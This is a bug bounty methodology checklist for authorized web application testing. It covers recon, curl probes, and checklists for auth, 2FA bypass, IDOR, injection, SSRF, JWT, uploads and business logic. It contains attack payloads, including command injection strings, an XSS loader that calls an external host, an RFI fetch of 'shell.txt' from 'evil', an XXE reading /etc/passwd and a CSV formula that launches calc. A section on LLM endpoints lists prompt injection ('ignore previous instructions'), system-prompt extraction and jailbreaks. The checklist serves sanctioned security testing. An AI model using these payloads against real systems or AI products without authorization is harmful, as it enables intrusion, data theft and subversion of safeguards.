# Bug Bounty Methodology Checklist (TBHM v2)

> Sources: Jason Haddix TBHM v4, Bug-Bounty Toolkit (sehno), 2FA-bypass checklist
> (0xmaximus), 2025 methodology (amrelsagaei), OWASP Top 10 + API Top 10,
> hackwithsingh checklist.
>
> Use this AFTER the automated scan as a manual review guide. The tool gives you
> leads — this checklist helps you turn leads into bugs.

---

## 0. Kali Linux Curl Testing (Quick Start)

Use these commands for manual verification on Kali Linux.

### 0.1 Environment Setup
```bash
export TARGET="https://target.com"
mkdir -p evidence/{headers,bodies,raw}
```

### 0.2 Basic Reachability
```bash
curl -sk -D evidence/headers/root.txt -o evidence/bodies/root.html "$TARGET/"
curl -sk -I -L -w "URL=%{url_effective}\nHTTP=%{http_code}\nIP=%{remote_ip}\n" "$TARGET/"
```

### 0.3 Security Header & Method Probes
```bash
# Check OPTIONS & TRACE
curl -sk -i -X OPTIONS "$TARGET/"
curl -sk -i -X TRACE "$TARGET/"

# Host Header Injection
curl -sk -i "$TARGET/" -H "Host: evil.com"

# CORS Testing
curl -sk -i "$TARGET/" -H "Origin: https://evil.com"
```

---

## 1. Reconnaissance (passive)

- [ ] WHOIS / RDAP for organization, name servers, registrar
- [ ] ASN enumeration (BGP tables, hurricane-electric, ipinfo.io)
- [ ] Reverse-DNS the ASN ranges
- [ ] crt.sh + Censys + Shodan favicon hash for asset expansion
- [ ] Wayback Machine + gau + commoncrawl for old endpoints
- [ ] GitHub dorks: `"target.com" password`, `"target.com" api_key`,
      `"target.com" filename:.env`, `extension:json target.com`
- [ ] Cloud asset hunting: S3 buckets (`<org>-prod`, `<org>-backup`),
      Azure blobs, GCS buckets
- [ ] Subdomain enum: subfinder, assetfinder, amass passive, chaos
- [ ] Permutation generation (altdns, gotator) on found subdomains
- [ ] Acquisitions list (Crunchbase, news) — often in scope under root org

## 2. Active asset surface

- [ ] DNS brute-force with SecLists (top-5K → top-110K)
- [ ] Live host detection (httpx) with status, title, tech, CDN
- [ ] Port scan top-1000 + alt ports (8080, 8443, 8888, 9200, 5601, 27017)
- [ ] Tech fingerprinting (wappalyzer, httpx tech-detect, builtwith)
- [ ] Screenshot all hosts (gowitness, eyewitness, aquatone)
- [ ] CDN bypass research (origin IP via DNS history, censys cert search)
- [ ] Mobile-API hunting: `api.`, `mobile-api.`, `m.`, `app.`
- [ ] Subdomain takeovers: subzy, nuclei takeover templates

## 3. Content discovery

- [ ] ffuf with SecLists raft / common / quickhits
- [ ] API-specific paths from SecLists Discovery/Web-Content/api/
- [ ] `.well-known/security.txt` (program info, sometimes scope leaks)
- [ ] `robots.txt`, `sitemap.xml`
- [ ] Backup files: `.bak`, `.old`, `~`, `.swp`, `.zip`, `.tar.gz`
- [ ] `.git/`, `.svn/`, `.DS_Store`
- [ ] Version control history (git-dumper if `.git/` exposed)
- [ ] Cached / archived versions (Wayback)

## 4. JavaScript analysis

- [ ] Extract all .js files (subjs, getJS)
- [ ] Beautify minified JS (js-beautify)
- [ ] Endpoint extraction (LinkFinder, JSluice, regex grep)
- [ ] Secret hunting (trufflehog, gitleaks regex, custom)
- [ ] Source map exposure (`.js.map` files leak full source)
- [ ] Webpack chunk extraction → may reveal lazy-loaded routes
- [ ] Hardcoded admin tokens / API keys
- [ ] Look for `dangerouslySetInnerHTML`, `eval(`, `innerHTML =`

## 5. Authentication

- [ ] Username enumeration on login / signup / password-reset
- [ ] Password policy (length, complexity, common passwords)
- [ ] Rate limiting on login (try 100 attempts)
- [ ] Account lockout (does it exist? can it lock victim's account?)
- [ ] Session fixation (does logout invalidate the cookie?)
- [ ] Concurrent session handling
- [ ] "Remember me" token security (predictable? long-lived?)
- [ ] Password reset token: predictable, replayable, leaks via Referer
- [ ] Email verification bypass

## 6. 2FA / MFA bypass (from 0xmaximus checklist)

- [ ] Response manipulation (200 → bypass, change `success: false` to `true`)
- [ ] Status code manipulation (403 → 200)
- [ ] Disabling JS to bypass client-side 2FA enforcement
- [ ] Direct request to post-2FA endpoint (skip the OTP step)
- [ ] OTP reuse (use the same code twice)
- [ ] OTP brute-force (rate limit on `/2fa/verify`?)
- [ ] OTP leak in response (returned in JSON?)
- [ ] Backup-code reuse / brute-force
- [ ] Session token before 2FA == session token after 2FA?
- [ ] Race condition on enable/disable 2FA
- [ ] CSRF on 2FA disable endpoint
- [ ] Password reset → 2FA bypass (no 2FA after reset?)
- [ ] OAuth login → 2FA skipped (federated identities)
- [ ] Cookie tampering: `2fa_passed=false` → `true`
- [ ] Cross-account 2FA (use victim's session w/ attacker's OTP)

## 7. Authorization (IDOR / BAC)

- [ ] Test horizontal IDOR: Account A's session, request Account B's resources
- [ ] Test vertical IDOR: regular user → admin actions
- [ ] Predictable IDs (sequential integers, weak UUIDs)
- [ ] Mass-assignment: send `is_admin=true` in profile update
- [ ] Force browsing: navigate to admin paths directly
- [ ] HTTP method swap: POST → GET, DELETE → POST
- [ ] Path normalization: `/api/users/123/../456` reaches user 456?
- [ ] Header-based authorization: `X-User-Id`, `X-Original-URL` swap
- [ ] GraphQL field-level authorization
- [ ] WebSocket message authorization

## 8. Injection

- [ ] SQLi: error-based, boolean-blind, time-blind, OOB
- [ ] NoSQLi: `{"$ne": null}`, `{"$gt": ""}` in JSON params
- [ ] XSS: reflected, stored, DOM, blind (`<script src=//x.oast.live>`)
- [ ] Template injection: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`
- [ ] Command injection: `;ls`, `|id`, `` `id` ``, `$(id)`, `&id`
- [ ] LDAP injection: `*)(uid=*))(|(uid=*`
- [ ] XPath injection: `' or '1'='1`
- [ ] Header injection (CRLF): `%0d%0aSet-Cookie:`
- [ ] LFI / Path traversal (Linux + Windows)
- [ ] RFI: `?file=http://evil/shell.txt`
- [ ] XXE: `<!DOCTYPE x [<!ENTITY x SYSTEM "file:///etc/passwd">]>`

## 9. SSRF

- [ ] Cloud metadata (AWS, GCP, Azure, Digital Ocean, Alibaba)
- [ ] localhost / 127.0.0.1 / ::1 / 0.0.0.0
- [ ] DNS rebinding (oast.live, interact.sh)
- [ ] URL parser confusion: `http://attacker.com#@target.local/`
- [ ] Redirect chains (server follows your redirect to internal IP)
- [ ] Gopher / dict / file protocols
- [ ] PDF generators (chromium PDF rendering with file:// inside HTML)
- [ ] SVG with external entity
- [ ] Webhooks → SSRF when destination user-controlled

## 10. CSRF / CORS / Clickjacking

- [ ] State-changing GET endpoints
- [ ] Missing/weak CSRF token (predictable, not validated, reused)
- [ ] SameSite cookie missing → CSRF possible cross-site
- [ ] CORS reflects arbitrary Origin + credentials
- [ ] CORS Allow-Origin: null with credentials
- [ ] X-Frame-Options / CSP frame-ancestors missing → clickjacking
- [ ] postMessage origin validation (window-to-window comms)

## 11. Open Redirect / Cache poisoning

- [ ] `?next=https://evil.com`, `?return=`, `?redirect=`
- [ ] Bypass checks: `//evil.com`, `/\evil.com`, `https://target.com.evil.com`
- [ ] Web cache poisoning (X-Forwarded-Host, X-Host)
- [ ] Web cache deception (`/profile.css` cached as profile)

## 12. File Upload

- [ ] Extension blacklist bypass: `.php5`, `.phtml`, `.phar`
- [ ] Double extension: `.jpg.php`
- [ ] Null-byte: `shell.php%00.jpg`
- [ ] Content-Type bypass (lie about MIME)
- [ ] Magic-byte spoofing (PHP after GIF89a;)
- [ ] SVG XSS (`<svg><script>...</script></svg>`)
- [ ] XXE in DOCX/XLSX/SVG
- [ ] Filename injection: `../../../shell.php`
- [ ] Race condition: upload + access before AV scan
- [ ] CSV injection: `=cmd|' /c calc'!A1`

## 13. API-specific

- [ ] GraphQL introspection (production should be disabled)
- [ ] GraphQL field suggestions when introspection off
- [ ] GraphQL batched queries (rate-limit bypass)
- [ ] GraphQL alias (run same mutation N times in one request)
- [ ] REST verb tampering (PATCH instead of PUT)
- [ ] JSON → XML body switch (XXE on the side)
- [ ] Mass-assignment via PUT/PATCH
- [ ] Pagination abuse (`?limit=99999999`)
- [ ] API versioning differences (`/v1/` accepts what `/v2/` rejects)

## 14. JWT

- [ ] alg=none accepted
- [ ] HS256/RS256 confusion (use public key as HMAC secret)
- [ ] Weak HMAC secret (jwt_tool, hashcat mode 16500)
- [ ] kid header injection (LFI / SQLi via `kid` field)
- [ ] No expiry claim (`exp`)
- [ ] Token reuse after logout
- [ ] Key confusion (signed with wrong key still accepts)

## 15. Race conditions

- [ ] Coupon / promo redemption (single-use, applied N times)
- [ ] Withdrawal / transfer (double-spend)
- [ ] Vote / like / follow (counter manipulation)
- [ ] Account creation (same email N times)
- [ ] Use turbo-intruder / Burp Repeater "send group in parallel"

## 16. LLM / AI endpoints (modern category)

- [ ] Prompt injection ("ignore previous instructions")
- [ ] System prompt extraction
- [ ] Tool/function abuse (if LLM has tools)
- [ ] PII extraction from training/context
- [ ] Cost-exhaustion (huge prompts to drain tokens)
- [ ] Jailbreak via roleplay / encoding

## 17. Web3 (frontend + RPC)

- [ ] Private keys / mnemonics in JS
- [ ] Infura/Alchemy keys exposed (rate-limit theft)
- [ ] Exposed Geth/Parity RPC (8545, 8546)
- [ ] IPFS API exposure (5001, 5002)
- [ ] Front-running surfaces (mempool-visible mutations)
- [ ] WalletConnect URI leakage
- [ ] Note: smart-contract auditing is OUT OF SCOPE for this tool;
      use slither / mythril / echidna for contracts

## 18. Misconfiguration / Info disclosure

- [ ] Verbose error pages (stack traces in prod)
- [ ] Server header version disclosure
- [ ] Default credentials on admin panels
- [ ] Directory listing enabled
- [ ] phpinfo.php / info.php / test.php
- [ ] Spring Actuator endpoints (/env, /heapdump, /trace)
- [ ] Exposed `.env`, `.git/`, `.DS_Store`
- [ ] Source maps in production
- [ ] Debug mode (Django debug, Rails debug)

## 19. Business logic

- [ ] Negative quantities / prices
- [ ] Workflow skip (skip step 2 in 3-step flow)
- [ ] Time-of-check vs time-of-use (TOCTOU)
- [ ] Replay protection on critical actions
- [ ] Account merge / unlink edge cases
- [ ] Trial → paid conversion abuse
- [ ] Referral / loyalty point manipulation

## 20. Reporting

- [ ] Reproducer is < 5 steps
- [ ] PoC video for visual bugs
- [ ] Impact stated in business terms
- [ ] CVSS score (use https://www.first.org/cvss/calculator/3.1)
- [ ] CWE classification
- [ ] Suggested remediation
- [ ] No false claims about exploitability you didn't verify
- [ ] Did you check program scope ONE MORE TIME before submitting?
